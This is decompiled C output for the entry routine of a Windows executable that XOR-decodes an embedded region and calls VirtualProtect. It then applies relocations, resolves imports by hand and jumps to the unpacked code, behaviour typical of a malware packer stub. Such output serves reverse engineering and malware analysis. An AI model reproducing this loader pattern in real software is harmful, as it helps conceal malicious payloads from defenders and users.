__size32 global15 = 0xbe8eb153;// 4 bytes

// address: 0x401000
void _start(unsigned int param1, unsigned int param2, unsigned int param3) {
    int ax; 		// r0
    unsigned int ax_1; 		// r0{124}
    short cx; 		// r1
    unsigned char dl; 		// r10
    unsigned char dl_1; 		// r10{70}
    __size32 eax; 		// r24
    unsigned int eax_1; 		// r24{293}
    unsigned int eax_2; 		// r24{108}
    __size32 eax_3; 		// r24{139}
    unsigned int eax_4; 		// r24{394}
    unsigned int eax_5; 		// r24{187}
    void *ebp; 		// r29
    void *ebp_1; 		// r29{95}
    int *ebp_2; 		// r29{200}
    void *ebp_3; 		// r29{256}
    int *ebp_4; 		// r29{247}
    void *ebp_5; 		// r29{420}
    int *ebp_6; 		// r29{385}
    void *ebp_7; 		// r29{369}
    void *ebp_8; 		// r29{435}
    unsigned int ebx; 		// r27
    unsigned int ebx_1; 		// r27{323}
    unsigned int ebx_2; 		// r27{341}
    int ecx; 		// r25
    unsigned int ecx_1; 		// r25
    unsigned int *ecx_2; 		// r25{294}
    unsigned int *ecx_3; 		// r25{322}
    unsigned int edi; 		// r31
    unsigned int *edi_1; 		// r31
    unsigned int *edi_2; 		// r31{422}
    int edx; 		// r26
    void *edx_1; 		// r26
    __size32 *edx_2; 		// r26{311}
    unsigned int edx_3; 		// r26{229}
    __size32 esi; 		// r30
    __size32 esi_1; 		// r30{10}
    union { void * x5; unsigned int x6; } esi_10; 		// r30{421}
    union { void * x5; unsigned int x6; } esi_11; 		// r30{370}
    union { void * x5; unsigned int x6; } esi_12; 		// r30{436}
    __size32 esi_2; 		// r30{66}
    __size32 esi_3; 		// r30{85}
    union { void * x49; int x50; } esi_4; 		// r30{172}
    union { void * x5; unsigned int x6; } esi_5; 		// r30{249}
    __size32 esi_6; 		// r30{302}
    __size32 esi_7; 		// r30{297}
    union { void * x5; unsigned int x6; } esi_8; 		// r30{386}
    union { void * x5; unsigned int x6; } esi_9; 		// r30{406}
    int esp; 		// r28
    unsigned int local0; 		// m[esp - 40]
    __size32 *local1; 		// m[esp - 40]
    unsigned int local13; 		// m[esp - 36]
    __size32 *local18; 		// m[esp - 40]{470}
    unsigned int local19; 		// m[esp - 80]{473}
    unsigned int local2; 		// m[esp - 80]
    __size32 local20; 		// esi_7{297}
    __size32 local21; 		// esi_6{302}
    void *local22; 		// ebp_7{369}
    union { void * x5; unsigned int x6; } local23; 		// esi_11{370}
    unsigned int local24; 		// param1{456}
    int *local25; 		// ebp_6{385}
    union { void * x5; unsigned int x6; } local26; 		// esi_8{386}
    unsigned int local27; 		// eax_5{401}
    union { void * x5; unsigned int x6; } local28; 		// esi_9{406}
    unsigned int local29; 		// local2{465}
    void *local30; 		// ebp_5{420}
    union { void * x5; unsigned int x6; } local31; 		// esi_10{421}
    unsigned int local32; 		// local2{468}
    unsigned int local33; 		// eax_5{430}
    void *local34; 		// ebp_8{435}
    union { void * x5; unsigned int x6; } local35; 		// esi_12{436}
    union { void * x3; unsigned int x4; } local4; 		// m[esp - 76]

    esi_1 = 0;
    edi = 31;
    ebx = param2 + param3 * 4;
    eax = AddUsersToEncryptedFile();
    local20 = esi_1;
    local24 = param1;
    if (eax != 0) {
        eax = AreAllAccessesGranted();
        if (eax == 0) {
            edi = eax + 17;
        }
        eax = VirtualProtect(); /* Warning: also results in edx */
        ecx = 0;
        do {
            eax_1 = eax;
            ecx_2 = ecx;
            esi_7 = local20;
            local21 = esi_7;
            if (esi_7 == edi) {
                esi_2 = 0;
                local21 = esi_2;
            }
            esi_6 = local21;
            eax = eax_1 + eax_1;
            dl_1 = *(esi_6 + 0x404000);
            dl = (dl_1 ^ *(ecx_2 + 0x4015c8));
            edx = ((edx >> 8 & 0xffffff | (dl_1)) >> 8 & 0xffffff | (dl)) >> 8 & 0xffffff | (dl ^ -112);
            *(char*)(ecx_2 + 0x4015c8) = dl ^ -112;
            ebx = eax_1 + eax_1 + ebx * 4;
            ecx = ecx_2 + 1;
            esi_3 = esi_6 + 1;
            local20 = esi_3;
        } while (ecx_2 + 1 < 0x1440);
        ebp_1 = 0x401348;
        edx_1 = 0x4028c8;
        edi = 0;
        local0 = 0;
        local22 = ebp_1;
        local34 = ebp_1;
        do {
            edx_2 = edx_1;
            eax_2 = *(edx_2 + 4);
            eax = (eax_2 - 8) / 2;
            ax = (unsigned short) (eax_2 - 8) / 2;
            ecx = edx_2 + 8;
            cx = (unsigned short) edx_2 + 8;
            if ((int)((eax_2 - 8) / 2) > 0) {
                ebx = (eax_2 - 8) / 2;
                do {
                    ecx_3 = ecx;
                    ebx_1 = ebx;
                    ax_1 = *ecx_3;
                    ax = ax_1 & 0xfffff000;
                    eax = (eax >> 16 & 0xffff | (ax_1)) >> 16 & 0xffff | (ax_1 & 0xfffff000);
                    tmph = (ax_1 & 0xfffff000) - 0x3000;
                    if ((ax_1 & 0xfffff000) == 0x3000) {
                        edi = eax + edi * 4;
                        eax = *(unsigned short*)ecx_3;
                        eax_3 = (eax & 0xfff) + *edx_2;
                        eax = eax_3 + 0x401348;
                        ax = (unsigned short) eax_3 + 0x401348;
                        *(__size32*)(eax_3 + 0x401348) = *(eax_3 + 0x401348) - 0xfbfecb8;
                    }
                    ecx = ecx_3 + 2;
                    cx = (unsigned short) ecx_3 + 2;
                    ebx = ebx_1 - 1;
                } while (ebx_1 != 1);
                edi = local0;
            }
            ebx_2 = ebx;
            edi += *(edx_2 + 4);
            local0 = edi;
            ebx = ebx_2 * 3;
            edx_1 = edx_2 + *(edx_2 + 4);
        } while (edi < (unsigned int)-1);
        dl = (unsigned char) edx_1;
        edx_1 = edx_2 + *(edx_2 + 4);
        ebx = ebx_2 * 3;
        edi_1 = 0x4020b4;
        local1 = 0x4020b4;
        esi_4 = edx_1 - 0x1f7fd970;
        flags = SUBFLAGS32(*0x4020c4, 0, global15);
        local23 = esi_4;
        local33 = eax;
        local35 = esi_4;
        if (*0x4020c4 != 0) {
            do {
                ebp_7 = local22;
                esi_11 = local23;
                param1 = local24;
                ecx = *(edi_1 + 12);
                cx = (unsigned short) ecx + ebp_7;
                eax_5 = LoadLibraryA(ecx + ebp_7); /* Warning: also results in ecx */
                local26 = esi_11;
                local27 = eax_5;
                local28 = esi_11;
                local29 = param1;
                local30 = ebp_7;
                local31 = esi_11;
                local32 = param1;
                if (eax_5 != 0) {
                    ecx_1 = *edi_1;
                    cx = (unsigned short) ecx_1;
                    if (ecx_1 == 0) {
                        ecx_1 = *(edi_1 + 16);
                        cx = (unsigned short) ecx_1;
                    }
                    ebp_2 = ebp_7 + ecx_1;
                    ebx = eax_5 + ebx * 2;
                    edi = *(edi_1 + 16);
                    edi_1 = edi + 0x401348;
                    local25 = ebp_2;
                    if (*(ebp_7 + ecx_1) != 0) {
L9:
                        ebp_6 = local25;
                        esi_8 = local26;
                        ecx_1 = *ebp_6;
                        cx = (unsigned short) ecx_1;
                        if (ecx_1 >= 0) {
                            dl = 72;
                            cx = (unsigned short) ecx_1 + 0x40134a;
                            eax = GetProcAddress(eax_5, ecx_1 + 0x40134a); /* Warning: also results in ecx_1, edx */
                            goto L5;
                        }
                        eax = GetProcAddress(eax_5, ((unsigned short) ecx_1)); /* Warning: also results in ecx_1, edx_3 */
                        edx = esi_8 + edx_3 * 8;
                        dl = (unsigned char) esi_8 + edx_3 * 8;
L5:
                        eax_4 = eax;
                        *(unsigned int*)edi_1 = eax_4;
                        ebp_4 = ebp_6 + 4;
                        esi_5 = esi_8 + edx;
                        edi_1++;
                        local25 = ebp_4;
                        local26 = esi_5;
                        local27 = eax_4;
                        local28 = esi_5;
                        local29 = local2;
                        if (*(ebp_6 + 4) != 0) {
                            ax = (unsigned short) eax_5;
                            goto L9;
                        }
                    }
                    eax_5 = local27;
                    ecx = ecx_1;
                    esi_9 = local28;
                    local2 = local29;
                    ebp_3 = 0x401348;
                    edi_1 = local1;
                    local30 = ebp_3;
                    local31 = esi_9;
                    local32 = local2;
                }
                ebp_5 = local30;
                esi_10 = local31;
                edi_2 = edi_1;
                local2 = local32;
                edi_1 = edi_2 + 20;
                tmp1 = *(edi_2 + 36);
                flags = SUBFLAGS32(*(edi_2 + 36), 0, tmp1);
                local1 = edi_2 + 20;
                local22 = ebp_5;
                local23 = esi_10;
                local24 = local2;
                local33 = eax_5;
                local34 = ebp_5;
                local35 = esi_10;
            } while (*(edi_2 + 36) != 0);
        }
        eax_5 = local33;
        ebp_8 = local34;
        esi_12 = local35;
        (*0x401da8)(local19, local4, pc, 0x401000, 0x3000, 64, esp - 32, -1, -1, 0x401348, local18, local13, esi, ebp, param3, 228, ax, cx, 168, eax_5, ecx, 0x401da8, ebx, ebp_8, esi_12, edi_1, flags, ZF, CF);
        *(__size32*)(esp - 4) = 0;
        ExitProcess(*(esp - 4));
    }
    return;
}

